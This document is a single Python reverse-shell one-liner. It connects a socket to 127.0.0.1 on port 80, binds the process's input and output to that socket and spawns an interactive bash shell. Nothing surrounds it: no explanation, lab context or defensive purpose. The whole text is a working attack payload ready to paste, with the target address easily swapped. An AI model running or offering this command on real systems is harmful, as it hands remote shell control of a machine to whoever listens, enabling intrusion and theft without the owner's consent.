python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",80));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash");'
